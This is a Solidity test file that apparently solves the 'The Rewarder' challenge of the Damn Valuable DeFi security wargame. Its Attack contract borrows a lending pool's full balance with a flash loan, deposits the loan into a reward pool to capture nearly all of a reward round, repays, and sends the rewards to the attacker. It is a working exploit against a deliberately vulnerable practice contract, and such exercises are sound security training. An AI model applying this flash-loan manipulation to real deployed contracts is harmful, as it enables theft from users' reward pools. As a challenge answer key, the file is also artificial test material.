// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../Contracts/the-rewarder/FlashLoanerPool.sol";

contract Attack {
    DamnValuableToken internal dvt;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;

    constructor(
        DamnValuableToken _dvt,
        FlashLoanerPool pool,
        TheRewarderPool rPool
    ) public {
        dvt = _dvt;
        flashLoanerPool = pool;
        theRewarderPool = rPool;
    }

    function receiveFlashLoan(uint256 amount) public {
        console.log("receiveFlashLoan() called with msg.sender=", msg.sender);
        dvt.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.distributeRewards();
        theRewarderPool.withdraw(amount);
        dvt.transfer(address(flashLoanerPool), amount);
    }

    function startAttack() public {
        uint256 balance = flashLoanerPool.liquidityToken().balanceOf(
            address(flashLoanerPool)
        );
        flashLoanerPool.flashLoan(balance);
        theRewarderPool.rewardToken().transfer(
            msg.sender,
            theRewarderPool.rewardToken().balanceOf(address(this))
        );
    }
}

contract TheRewarder is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        vm.label(address(flashLoanerPool), "Flash Loaner Pool");

        // Set initial token balance of the pool offering flash loans
        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
            theRewarderPool.deposit(USER_DEPOSIT);
            assertEq(
                theRewarderPool.accToken().balanceOf(users[i]),
                USER_DEPOSIT
            );
            vm.stopPrank();
        }

        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(
                theRewarderPool.rewardToken().balanceOf(users[i]),
                25e18 // Each depositor gets 25 reward tokens
            );
            vm.stopPrank();
        }

        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
        assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
        assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.warp(block.timestamp + 5 days);
        vm.startPrank(attacker);
        Attack attack_obj = new Attack(dvt, flashLoanerPool, theRewarderPool);
        attack_obj.startAttack();
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
        for (uint8 i; i < 4; i++) {
            // Users should get negligible rewards this round
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(
                users[i]
            );
            uint256 delta = rewardPerUser - 25e18;
            assertLt(delta, 1e16);
        }
        // Rewards must have been issued to the attacker account
        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(
            attacker
        );

        // The amount of rewards earned should be really close to 100 tokens
        uint256 deltaAttacker = 100e18 - rewardAttacker;
        assertLt(deltaAttacker, 1e17);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(dvt.balanceOf(attacker), 0);
    }
}
